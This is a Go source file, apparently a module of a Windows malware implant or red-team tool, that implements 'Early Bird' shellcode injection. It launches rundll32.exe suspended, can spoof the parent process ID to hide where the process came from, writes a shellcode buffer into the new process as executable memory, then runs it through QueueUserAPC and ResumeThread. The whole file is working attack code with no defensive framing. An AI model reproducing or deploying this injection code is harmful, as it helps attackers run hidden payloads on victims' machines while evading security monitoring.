//go:build windows
// +build windows

package main

import (
	"fmt"
	"syscall"
	"unsafe"
)

func doEarlyBird(hProc uintptr, pid uint32, sc []byte) error {
	return doQueueUserAPC(hProc, pid, sc)
}

func doEarlyBirdInject(targetExe string, sc []byte) error {
	if targetExe == "" {
		targetExe = "rundll32.exe"
	}
	exePath := resolveSystem32Path(targetExe)

	var hProc uintptr
	var hThread uintptr

	if ppidSpoofEnabled {
		parentPID := findPidByName(ppidSpoofParent)
		if parentPID != 0 {
			hp, ht, _, err := createProcessWithPPIDSpoof(exePath, exePath, parentPID)
			if err == nil {
				hProc = hp
				hThread = ht
			} else if Debug {
				fmt.Printf("[!] PPID spoof failed in early bird (%v), falling back\n", err)
			}
		} else if Debug {
			fmt.Printf("[!] %s not found, skipping PPID spoof in early bird\n", ppidSpoofParent)
		}
	}

	if hProc == 0 {
		si := &startupInfoExW{cb: uint32(unsafe.Sizeof(startupInfoExW{})), dwFlags: 0x00000001}
		pi := processInformation{}

		exePtr, _ := syscall.UTF16PtrFromString(exePath)
		cmdLine, _ := syscall.UTF16PtrFromString(exePath)

		ret, _, _ := procCreateProcessW.Call(
			uintptr(unsafe.Pointer(exePtr)),
			uintptr(unsafe.Pointer(cmdLine)),
			0, 0, 0,
			uintptr(createSuspended),
			0, 0,
			uintptr(unsafe.Pointer(si)),
			uintptr(unsafe.Pointer(&pi)),
		)
		if ret == 0 {
			return fmt.Errorf("CreateProcess failed")
		}
		hProc = pi.hProcess
		hThread = pi.hThread
	}
	defer procCloseHandle.Call(hProc)
	defer procCloseHandle.Call(hThread)

	addr, err := allocateRX(hProc, sc)
	if err != nil {
		return fmt.Errorf("allocateRX in spawned process failed: %w", err)
	}

	procQueueUserAPC.Call(addr, hThread, 0)
	procResumeThread.Call(hThread)

	return nil
}

func resolveSystem32Path(name string) string {
	envStr, _ := syscall.UTF16PtrFromString("%windir%\\system32\\" + name)
	var buf [260]uint16
	procExpandEnvironmentStringsW.Call(
		uintptr(unsafe.Pointer(envStr)),
		uintptr(unsafe.Pointer(&buf[0])),
		uintptr(len(buf)),
	)
	res := syscall.UTF16ToString(buf[:])
	if res == "" {
		return "C:\\Windows\\system32\\" + name
	}
	return res
}
